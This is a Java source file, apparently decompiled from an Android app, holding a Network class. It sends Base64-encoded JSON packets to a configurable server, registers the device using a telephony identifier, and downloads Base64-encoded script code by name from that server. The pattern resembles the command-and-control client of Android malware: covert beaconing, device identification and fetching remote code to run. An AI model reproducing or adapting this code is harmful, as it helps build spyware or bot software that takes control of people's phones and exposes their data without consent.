package com.address.core;

import android.util.Base64;
import com.address.core.net.Packet;
import com.address.core.packets.GetScript;
import com.address.core.packets.GetScript.Answer;
import com.address.core.utilities.NetworkState;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;

public class Network {
    public static String _url = "";
    private static HttpParams httpParams = new BasicHttpParams();
    private static HttpClient httpclient = null;

    public static void init(String url) {
        _url = url;
        HttpConnectionParams.setConnectionTimeout(httpParams, 5000);
        httpclient = new DefaultHttpClient(httpParams);
    }

    public static String postParams(String... params) {
        Log.write("postParams: " + params.length);
        if (NetworkState.isOnline().booleanValue()) {
            List<NameValuePair> prm = new ArrayList();
            for (int i = 0; i < params.length - 1; i += 2) {
                prm.add(new BasicNameValuePair(params[i], params[i + 1]));
            }
            try {
                HttpPost httppost = new HttpPost(_url);
                httppost.setEntity(new UrlEncodedFormEntity(prm));
                httppost.setHeader("user-agent", Consts.userAgent);
                String responseBody = (String) httpclient.execute(httppost, new BasicResponseHandler());
                Log.write("responseBody: " + responseBody);
                return responseBody;
            } catch (ClientProtocolException e) {
                Log.write(e.getStackTrace().toString());
                return "";
            } catch (IOException e2) {
                Log.write(e2.getStackTrace().toString());
                return "";
            } catch (Exception e3) {
                return "";
            }
        }
        Log.write("NO INET");
        return "";
    }

    public static String log(String msg) {
        return "";
    }

    public static String postData(String data) {
        try {
            return postParams("data", data);
        } catch (Exception e) {
            Log.write("Exception postData: " + e.toString());
            return "";
        }
    }

    public static String post(Packet packet) {
        byte[] json = packet.getJSON().getBytes(Charset.forName("UTF-8"));
        Log.write("post.json: " + json.toString());
        return postData(Base64.encodeToString(json, 2));
    }

    public static String postBase64(Packet packet) {
        Log.write("postbase64: " + packet.action);
        String encoded = Base64.encodeToString(packet.getJSON().getBytes(), 2);
        String decStr = postData(encoded);
        Log.write("decStr: " + encoded);
        String dec = new String(Base64.decode(decStr, 2), Charset.forName("UTF-8"));
        Log.write("dec: " + dec);
        return dec;
    }

    public static String postBase64Json(String json) {
        Log.write("postbase64json: " + json);
        String encoded = Base64.encodeToString(json.getBytes(), 2);
        String decStr = postData(encoded);
        Log.write("decStrjson: " + encoded);
        String dec = new String(Base64.decode(decStr, 2), Charset.forName("UTF-8"));
        Log.write("decjson: " + dec);
        return dec;
    }

    public static String postBase64JsonNet(String json) {
        Log.write("postbase64jsonnet: " + json);
        String encoded = Base64.encodeToString(json.getBytes(), 2);
        RunService.getService().sendNetPacket(encoded);
        return encoded;
    }

    public static Boolean register() {
        if (RunService.getService().getSettings().get("registered").equals("true")) {
            Log.write("already registered");
        } else {
            RunService.getService().getSettings().set("id", RunService.getService().getAPI().getTelephonyInfo()[0]);
            RunService.getService().getSettings().set("registered", "true");
        }
        return Boolean.valueOf(true);
    }

    public static String getScript(String scriptName) {
        try {
            String code = "";
            return new String(Base64.decode(((Answer) Packet.get(new GetScript(scriptName), Answer.class)).code, 2), Charset.forName("UTF-8"));
        } catch (Exception e) {
            return "";
        }
    }
}
